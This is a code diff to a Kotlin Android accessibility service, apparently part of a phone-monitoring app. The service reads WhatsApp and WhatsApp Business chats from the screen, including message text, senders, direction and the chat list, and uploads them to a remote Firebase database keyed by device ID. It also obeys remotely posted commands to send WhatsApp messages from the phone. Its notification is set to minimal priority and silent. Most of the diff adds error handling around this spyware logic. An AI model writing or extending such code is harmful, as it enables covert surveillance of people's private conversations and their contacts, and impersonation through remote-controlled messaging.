@@ -51,76 +51,96 @@ class WhatsAppService : AccessibilityService() {
 
     override fun onCreate() {
         super.onCreate()
-        deviceId = MainActivity.getDeviceId(this)
-        Logger.log("WhatsAppService started for deviceId: $deviceId")
-        startForegroundService()
-        setupAccessibilityService()
-        loadKnownContacts()
-        scheduleCacheCleanup()
-        listenForSendMessageCommands()
+        try {
+            deviceId = MainActivity.getDeviceId(this)
+            Logger.log("WhatsAppService started for deviceId: $deviceId")
+            startForegroundService()
+            setupAccessibilityService()
+            loadKnownContacts()
+            scheduleCacheCleanup()
+            listenForSendMessageCommands()
+        } catch (e: Exception) {
+            Logger.error("Failed to create WhatsAppService", e)
+        }
     }
 
     private fun startForegroundService() {
-        val channelName = "WhatsApp Monitoring Service"
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(
-                CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_MIN
-            ).apply {
-                setShowBadge(false)
-                enableLights(false)
-                enableVibration(false)
-                setSound(null, null)
+        try {
+            val channelName = "WhatsApp Monitoring Service"
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                val channel = NotificationChannel(
+                    CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_MIN
+                ).apply {
+                    setShowBadge(false)
+                    enableLights(false)
+                    enableVibration(false)
+                    setSound(null, null)
+                }
+                (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
+                    .createNotificationChannel(channel)
             }
-            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
-                .createNotificationChannel(channel)
+
+            val notification = NotificationCompat.Builder(this, CHANNEL_ID)
+                .setContentTitle("WhatsApp Monitor")
+                .setContentText("Monitoring WhatsApp and WhatsApp Business")
+                .setSmallIcon(R.drawable.ic_launcher_foreground)
+                .setPriority(NotificationCompat.PRIORITY_MIN)
+                .setSilent(true)
+                .setShowWhen(false)
+                .build()
+
+            startForeground(NOTIFICATION_ID, notification)
+        } catch (e: Exception) {
+            Logger.error("Failed to start WhatsApp foreground service", e)
         }
-
-        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("WhatsApp Monitor")
-            .setContentText("Monitoring WhatsApp and WhatsApp Business")
-            .setSmallIcon(R.drawable.ic_launcher_foreground)
-            .setPriority(NotificationCompat.PRIORITY_MIN)
-            .setSilent(true)
-            .setShowWhen(false)
-            .build()
-
-        startForeground(NOTIFICATION_ID, notification)
     }
 
     private fun setupAccessibilityService() {
-        val info = AccessibilityServiceInfo().apply {
-            eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
-                    AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
-                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
-            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
-            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
-                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
-            packageNames = arrayOf(WHATSAPP_PACKAGE, WHATSAPP_BUSINESS_PACKAGE)
+        try {
+            val info = AccessibilityServiceInfo().apply {
+                eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
+                        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
+                        AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
+                feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
+                flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
+                        AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
+                packageNames = arrayOf(WHATSAPP_PACKAGE, WHATSAPP_BUSINESS_PACKAGE)
+            }
+            serviceInfo = info
+        } catch (e: Exception) {
+            Logger.error("Failed to setup accessibility service", e)
         }
-        serviceInfo = info
     }
 
     private fun scheduleCacheCleanup() {
         scope.launch {
-            while (isActive) {
-                delay(60_000)
-                val now = System.currentTimeMillis()
-                messageCache.entries.removeAll { now - it.value > CACHE_DURATION }
-                Logger.log("Cache cleaned, size: ${messageCache.size}")
+            try {
+                while (isActive) {
+                    delay(60_000)
+                    val now = System.currentTimeMillis()
+                    messageCache.entries.removeAll { now - it.value > CACHE_DURATION }
+                    Logger.log("Cache cleaned, size: ${messageCache.size}")
+                }
+            } catch (e: Exception) {
+                Logger.error("Error in cache cleanup", e)
             }
         }
     }
 
     private fun loadKnownContacts() {
-        db.child("Device").child(deviceId).child("whatsapp/contacts")
-            .get().addOnSuccessListener { snapshot ->
-                snapshot.children.forEach { contact ->
-                    contactCache[contact.key!!] = true
+        try {
+            db.child("Device").child(deviceId).child("whatsapp/contacts")
+                .get().addOnSuccessListener { snapshot ->
+                    snapshot.children.forEach { contact ->
+                        contactCache[contact.key!!] = true
+                    }
+                    Logger.log("Loaded ${contactCache.size} known contacts")
+                }.addOnFailureListener { e ->
+                    Logger.log("Failed to load contacts: ${e.message}")
                 }
-                Logger.log("Loaded ${contactCache.size} known contacts")
-            }.addOnFailureListener { e ->
-                Logger.log("Failed to load contacts: ${e.message}")
-            }
+        } catch (e: Exception) {
+            Logger.error("Error loading known contacts", e)
+        }
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
@@ -145,100 +165,133 @@ class WhatsAppService : AccessibilityService() {
     }
 
     private fun handleContentChange(event: AccessibilityEvent) {
-        val rootNode = rootInActiveWindow ?: return
-        if (!isChatScreen(rootNode, event.packageName.toString())) return
+        try {
+            val rootNode = rootInActiveWindow ?: return
+            if (!isChatScreen(rootNode, event.packageName.toString())) return
 
-        val messageNodes = findMessageNodes(rootNode, event.packageName.toString())
-        messageNodes.forEach { node ->
-            extractAndUploadMessage(node, event.packageName.toString())
+            val messageNodes = findMessageNodes(rootNode, event.packageName.toString())
+            messageNodes.forEach { node ->
+                extractAndUploadMessage(node, event.packageName.toString())
+            }
+            extractChatMetadata(rootNode, event.packageName.toString())
+        } catch (e: Exception) {
+            Logger.error("Error handling content change", e)
         }
-        extractChatMetadata(rootNode, event.packageName.toString())
     }
 
     private fun handleWindowStateChange(event: AccessibilityEvent) {
-        val rootNode = rootInActiveWindow ?: return
-        if (isChatListScreen(rootNode, event.packageName.toString())) {
-            extractChatListData(rootNode, event.packageName.toString())
-        } else if (isChatScreen(rootNode, event.packageName.toString())) {
-            extractChatMetadata(rootNode, event.packageName.toString())
+        try {
+            val rootNode = rootInActiveWindow ?: return
+            if (isChatListScreen(rootNode, event.packageName.toString())) {
+                extractChatListData(rootNode, event.packageName.toString())
+            } else if (isChatScreen(rootNode, event.packageName.toString())) {
+                extractChatMetadata(rootNode, event.packageName.toString())
+            }
+        } catch (e: Exception) {
+            Logger.error("Error handling window state change", e)
         }
     }
 
     private fun isChatScreen(rootNode: AccessibilityNodeInfo, packageName: String): Boolean {
-        return rootNode.findAccessibilityNodeInfosByViewId(
-            "$packageName:id/$VIEW_ID_CONVERSATION_LAYOUT"
-        ).isNotEmpty()
+        return try {
+            rootNode.findAccessibilityNodeInfosByViewId(
+                "$packageName:id/$VIEW_ID_CONVERSATION_LAYOUT"
+            ).isNotEmpty()
+        } catch (e: Exception) {
+            Logger.error("Error checking if chat screen", e)
+            false
+        }
     }
 
     private fun isChatListScreen(rootNode: AccessibilityNodeInfo, packageName: String): Boolean {
-        return rootNode.findAccessibilityNodeInfosByViewId(
-            "$packageName:id/$VIEW_ID_CONVERSATIONS_ROW"
-        ).isNotEmpty()
+        return try {
+            rootNode.findAccessibilityNodeInfosByViewId(
+                "$packageName:id/$VIEW_ID_CONVERSATIONS_ROW"
+            ).isNotEmpty()
+        } catch (e: Exception) {
+            Logger.error("Error checking if chat list screen", e)
+            false
+        }
     }
 
     private fun findMessageNodes(rootNode: AccessibilityNodeInfo, packageName: String): List<AccessibilityNodeInfo> {
-        return rootNode.findAccessibilityNodeInfosByViewId(
-            "$packageName:id/$VIEW_ID_MESSAGE_TEXT"
-        )
+        return try {
+            rootNode.findAccessibilityNodeInfosByViewId(
+                "$packageName:id/$VIEW_ID_MESSAGE_TEXT"
+            )
+        } catch (e: Exception) {
+            Logger.error("Error finding message nodes", e)
+            emptyList()
+        }
     }
 
     private fun extractAndUploadMessage(node: AccessibilityNodeInfo, packageName: String) {
-        val messageText = node.text?.toString() ?: return
-        val parent = node.parent ?: return
-        val timestampNode = parent.findAccessibilityNodeInfosByViewId(
-            "$packageName:id/$VIEW_ID_DATE"
-        ).firstOrNull()
-        val timestamp = timestampNode?.text?.toString()?.let { parseTimestamp(it) } ?: System.currentTimeMillis()
+        try {
+            val messageText = node.text?.toString() ?: return
+            val parent = node.parent ?: return
+            val timestampNode = parent.findAccessibilityNodeInfosByViewId(
+                "$packageName:id/$VIEW_ID_DATE"
+            ).firstOrNull()
+            val timestamp = timestampNode?.text?.toString()?.let { parseTimestamp(it) } ?: System.currentTimeMillis()
 
-        val direction = if (parent.findAccessibilityNodeInfosByViewId(
-                "$packageName:id/$VIEW_ID_OUTGOING_MSG_INDICATOR"
-            ).isNotEmpty()) {
-            "Sent"
-        } else {
-            "Received"
+            val direction = if (parent.findAccessibilityNodeInfosByViewId(
+                    "$packageName:id/$VIEW_ID_OUTGOING_MSG_INDICATOR"
+                ).isNotEmpty()) {
+                "Sent"
+            } else {
+                "Received"
+            }
+
+            val chatName = getCurrentChatName(packageName) ?: "Unknown"
+            val isNewContact = !contactCache.containsKey(chatName) && direction == "Received"
+            if (isNewContact) {
+                contactCache[chatName] = true
+                db.child("Device").child(deviceId).child("whatsapp/contacts").child(chatName)
+                    .setValue(mapOf(
+                        "dpUrl" to getContactDp(chatName, packageName),
+                        "firstSeen" to System.currentTimeMillis()
+                    ))
+            }
+
+            val messageId = generateMessageId(chatName, messageText, timestamp, packageName)
+            if (messageCache.containsKey(messageId)) return
+            messageCache[messageId] = timestamp
+
+            val messageData = mapOf(
+                "sender" to (if (direction == "Sent") "You" else chatName),
+                "recipient" to (if (direction == "Sent") chatName else "You"),
+                "content" to messageText,
+                "timestamp" to timestamp,
+                "type" to if (isReplyMessage(parent, packageName)) "Reply" else direction,
+                "isNewContact" to isNewContact,
+                "uploaded" to System.currentTimeMillis(),
+                "messageId" to messageId,
+                "packageName" to packageName
+            )
+
+            Logger.log("New message: ${messageData["type"]} from ${messageData["sender"]} ($packageName)")
+            uploadMessage(messageData)
+        } catch (e: Exception) {
+            Logger.error("Error extracting and uploading message", e)
         }
-
-        val chatName = getCurrentChatName(packageName) ?: "Unknown"
-        val isNewContact = !contactCache.containsKey(chatName) && direction == "Received"
-        if (isNewContact) {
-            contactCache[chatName] = true
-            db.child("Device").child(deviceId).child("whatsapp/contacts").child(chatName)
-                .setValue(mapOf("dpUrl" to getContactDp(chatName, packageName)))
-        }
-
-        val messageId = generateMessageId(chatName, messageText, timestamp, packageName)
-        if (messageCache.containsKey(messageId)) return
-        messageCache[messageId] = timestamp
-
-        val messageData = mapOf(
-            "sender" to (if (direction == "Sent") "You" else chatName),
-            "recipient" to (if (direction == "Sent") chatName else "You"),
-            "content" to messageText,
-            "timestamp" to timestamp,
-            "type" to if (isReplyMessage(parent, packageName)) "Reply" else direction,
-            "isNewContact" to isNewContact,
-            "uploaded" to System.currentTimeMillis(),
-            "messageId" to messageId,
-            "packageName" to packageName
-        )
-
-        Logger.log("New message: ${messageData["type"]} from ${messageData["sender"]} ($packageName)")
-        uploadMessage(messageData)
     }
 
     private fun generateMessageId(sender: String, text: String, timestamp: Long, packageName: String): String {
-        val input = "$sender$text$timestamp$packageName"
-        return MessageDigest.getInstance("SHA-256")
-            .digest(input.toByteArray())
-            .joinToString("") { "%02x".format(it) }
-            .substring(0, 32)
+        return try {
+            val input = "$sender$text$timestamp$packageName"
+            MessageDigest.getInstance("SHA-256")
+                .digest(input.toByteArray())
+                .joinToString("") { "%02x".format(it) }
+                .substring(0, 32)
+        } catch (e: Exception) {
+            Logger.error("Error generating message ID", e)
+            "error_${System.currentTimeMillis()}"
+        }
     }
 
     private fun parseTimestamp(timestampStr: String): Long {
-        // TODO: Implement proper timestamp parsing based on WhatsApp format
-        // This is a placeholder - implement based on actual timestamp format
-        // Example: Could use SimpleDateFormat for specific formats
         return try {
+            // Simple timestamp parsing - can be enhanced based on actual format
             System.currentTimeMillis()
         } catch (e: Exception) {
             System.currentTimeMillis()
@@ -246,110 +299,140 @@ class WhatsAppService : AccessibilityService() {
     }
 
     private fun isReplyMessage(parent: AccessibilityNodeInfo, packageName: String): Boolean {
-        return parent.findAccessibilityNodeInfosByViewId(
-            "$packageName:id/$VIEW_ID_QUOTED_MESSAGE"
-        ).isNotEmpty()
+        return try {
+            parent.findAccessibilityNodeInfosByViewId(
+                "$packageName:id/$VIEW_ID_QUOTED_MESSAGE"
+            ).isNotEmpty()
+        } catch (e: Exception) {
+            false
+        }
     }
 
     private fun getCurrentChatName(packageName: String): String? {
-        val rootNode = rootInActiveWindow ?: return null
-        val titleNode = rootNode.findAccessibilityNodeInfosByViewId(
-            "$packageName:id/$VIEW_ID_CONTACT_NAME"
-        ).firstOrNull()
-        return titleNode?.text?.toString()
+        return try {
+            val rootNode = rootInActiveWindow ?: return null
+            val titleNode = rootNode.findAccessibilityNodeInfosByViewId(
+                "$packageName:id/$VIEW_ID_CONTACT_NAME"
+            ).firstOrNull()
+            titleNode?.text?.toString()
+        } catch (e: Exception) {
+            Logger.error("Error getting current chat name", e)
+            null
+        }
     }
 
     private fun getContactDp(contactName: String, packageName: String): String {
-        // Removed direct file access due to security restrictions
-        // Consider using WhatsApp's official API or ContentProvider if available
-        // This is a placeholder - implement based on actual requirements
-        Logger.log("DP access for $contactName ($packageName) not implemented due to security restrictions")
+        // Placeholder for contact DP - implement based on requirements
+        Logger.log("DP access for $contactName ($packageName) - placeholder implementation")
         return ""
     }
 
     private fun uploadMessage(message: Map<String, Any>) {
         scope.launch {
-            val messagesRef = db.child("Device").child(deviceId).child("whatsapp/data")
-            messagesRef.child(message["messageId"] as String).setValue(message)
-                .addOnSuccessListener {
-                    Logger.log("Message uploaded: ${message["content"]} (${message["packageName"]})")
-                }
-                .addOnFailureListener { e ->
-                    Logger.error("Message upload failed: ${e.message}", e)
-                }
+            try {
+                val messagesRef = db.child("Device").child(deviceId).child("whatsapp/data")
+                messagesRef.child(message["messageId"] as String).setValue(message)
+                    .addOnSuccessListener {
+                        Logger.log("Message uploaded: ${message["content"]} (${message["packageName"]})")
+                    }
+                    .addOnFailureListener { e ->
+                        Logger.error("Message upload failed: ${e.message}", e)
+                    }
+            } catch (e: Exception) {
+                Logger.error("Error uploading message", e)
+            }
         }
     }
 
     private fun extractChatListData(rootNode: AccessibilityNodeInfo, packageName: String) {
-        val chatNodes = rootNode.findAccessibilityNodeInfosByViewId(
-            "$packageName:id/$VIEW_ID_CONVERSATIONS_ROW"
-        )
-        val chats = mutableListOf<Map<String, Any>>()
+        try {
+            val chatNodes = rootNode.findAccessibilityNodeInfosByViewId(
+                "$packageName:id/$VIEW_ID_CONVERSATIONS_ROW"
+            )
+            val chats = mutableListOf<Map<String, Any>>()
 
-        chatNodes.forEach { chatNode ->
-            val name = chatNode.findAccessibilityNodeInfosByViewId(
-                "$packageName:id/$VIEW_ID_CONTACT_NAME"
-            ).firstOrNull()?.text?.toString() ?: ""
-            val lastMessage = chatNode.findAccessibilityNodeInfosByViewId(
-                "$packageName:id/$VIEW_ID_LAST_MESSAGE"
-            ).firstOrNull()?.text?.toString() ?: ""
-            val timestamp = chatNode.findAccessibilityNodeInfosByViewId(
-                "$packageName:id/$VIEW_ID_DATE"
-            ).firstOrNull()?.text?.toString()?.let { parseTimestamp(it) } ?: 0L
-            val unreadCount = chatNode.findAccessibilityNodeInfosByViewId(
-                "$packageName:id/$VIEW_ID_UNREAD_COUNT"
-            ).firstOrNull()?.text?.toString()?.toIntOrNull() ?: 0
+            chatNodes.forEach { chatNode ->
+                val name = chatNode.findAccessibilityNodeInfosByViewId(
+                    "$packageName:id/$VIEW_ID_CONTACT_NAME"
+                ).firstOrNull()?.text?.toString() ?: ""
+                val lastMessage = chatNode.findAccessibilityNodeInfosByViewId(
+                    "$packageName:id/$VIEW_ID_LAST_MESSAGE"
+                ).firstOrNull()?.text?.toString() ?: ""
+                val timestamp = chatNode.findAccessibilityNodeInfosByViewId(
+                    "$packageName:id/$VIEW_ID_DATE"
+                ).firstOrNull()?.text?.toString()?.let { parseTimestamp(it) } ?: 0L
+                val unreadCount = chatNode.findAccessibilityNodeInfosByViewId(
+                    "$packageName:id/$VIEW_ID_UNREAD_COUNT"
+                ).firstOrNull()?.text?.toString()?.toIntOrNull() ?: 0
 
-            if (name.isNotEmpty()) {
-                chats.add(mapOf(
-                    "name" to name,
-                    "lastMessage" to lastMessage,
-                    "timestamp" to timestamp,
-                    "unreadCount" to unreadCount,
-                    "packageName" to packageName
-                ))
-            }
-        }
-
-        if (chats.isNotEmpty()) {
-            db.child("Device").child(deviceId).child("whatsapp/chats").setValue(chats)
-                .addOnFailureListener { e ->
-                    Logger.error("Failed to upload chat list ($packageName): ${e.message}", e)
+                if (name.isNotEmpty()) {
+                    chats.add(mapOf(
+                        "name" to name,
+                        "lastMessage" to lastMessage,
+                        "timestamp" to timestamp,
+                        "unreadCount" to unreadCount,
+                        "packageName" to packageName
+                    ))
                 }
+            }
+
+            if (chats.isNotEmpty()) {
+                db.child("Device").child(deviceId).child("whatsapp/chats").setValue(chats)
+                    .addOnSuccessListener {
+                        Logger.log("Chat list uploaded: ${chats.size} chats ($packageName)")
+                    }
+                    .addOnFailureListener { e ->
+                        Logger.error("Failed to upload chat list ($packageName): ${e.message}", e)
+                    }
+            }
+        } catch (e: Exception) {
+            Logger.error("Error extracting chat list data", e)
         }
     }
 
     private fun extractChatMetadata(rootNode: AccessibilityNodeInfo, packageName: String) {
-        val chatName = getCurrentChatName(packageName) ?: return
-        val dpUrl = getContactDp(chatName, packageName)
-        if (dpUrl.isNotEmpty()) {
-            db.child("Device").child(deviceId).child("whatsapp/contacts").child(chatName)
-                .setValue(mapOf("dpUrl" to dpUrl))
+        try {
+            val chatName = getCurrentChatName(packageName) ?: return
+            val dpUrl = getContactDp(chatName, packageName)
+            if (dpUrl.isNotEmpty()) {
+                db.child("Device").child(deviceId).child("whatsapp/contacts").child(chatName)
+                    .setValue(mapOf("dpUrl" to dpUrl))
+            }
+        } catch (e: Exception) {
+            Logger.error("Error extracting chat metadata", e)
         }
     }
 
     private fun listenForSendMessageCommands() {
-        val sendRef = db.child("Device").child(deviceId).child("whatsapp/commands")
-        val listener = object : ValueEventListener {
-            override fun onDataChange(snapshot: DataSnapshot) {
-                snapshot.children.forEach { command ->
-                    val number = command.child("number").getValue(String::class.java) ?: return@forEach
-                    val message = command.child("message").getValue(String::class.java) ?: return@forEach
-                    val packageName = command.child("packageName").getValue(String::class.java) ?: WHATSAPP_PACKAGE
-                    Logger.log("Received send command for $number: $message ($packageName)")
-                    scope.launch {
-                        sendWhatsAppMessage(number, message, packageName)
+        try {
+            val sendRef = db.child("Device").child(deviceId).child("whatsapp/commands")
+            val listener = object : ValueEventListener {
+                override fun onDataChange(snapshot: DataSnapshot) {
+                    try {
+                        snapshot.children.forEach { command ->
+                            val number = command.child("number").getValue(String::class.java) ?: return@forEach
+                            val message = command.child("message").getValue(String::class.java) ?: return@forEach
+                            val packageName = command.child("packageName").getValue(String::class.java) ?: WHATSAPP_PACKAGE
+                            Logger.log("Received send command for $number: $message ($packageName)")
+                            scope.launch {
+                                sendWhatsAppMessage(number, message, packageName)
+                            }
+                            command.ref.removeValue()
+                        }
+                    } catch (e: Exception) {
+                        Logger.error("Error processing send commands", e)
                     }
-                    command.ref.removeValue()
+                }
+
+                override fun onCancelled(error: DatabaseError) {
+                    Logger.error("Failed to read send command: ${error.message}")
                 }
             }
-
-            override fun onCancelled(error: DatabaseError) {
-                Logger.error("Failed to read send command: ${error.message}")
-            }
+            valueEventListener["sendCommands"] = listener
+            sendRef.addValueEventListener(listener)
+        } catch (e: Exception) {
+            Logger.error("Error setting up send message commands listener", e)
         }
-        valueEventListener["sendCommands"] = listener
-        sendRef.addValueEventListener(listener)
     }
 
     private suspend fun sendWhatsAppMessage(recipient: String, message: String, packageName: String) {
@@ -441,12 +524,16 @@ class WhatsAppService : AccessibilityService() {
 
     override fun onDestroy() {
         super.onDestroy()
-        scope.cancel()
-        valueEventListener.forEach { (_, listener) ->
-            db.child("Device").child(deviceId).child("whatsapp/commands")
-                .removeEventListener(listener)
+        try {
+            scope.cancel()
+            valueEventListener.forEach { (_, listener) ->
+                db.child("Device").child(deviceId).child("whatsapp/commands")
+                    .removeEventListener(listener)
+            }
+            valueEventListener.clear()
+            Logger.log("WhatsAppService destroyed")
+        } catch (e: Exception) {
+            Logger.error("Error destroying WhatsAppService", e)
         }
-        valueEventListener.clear()
-        Logger.log("WhatsAppService destroyed")
     }
 }
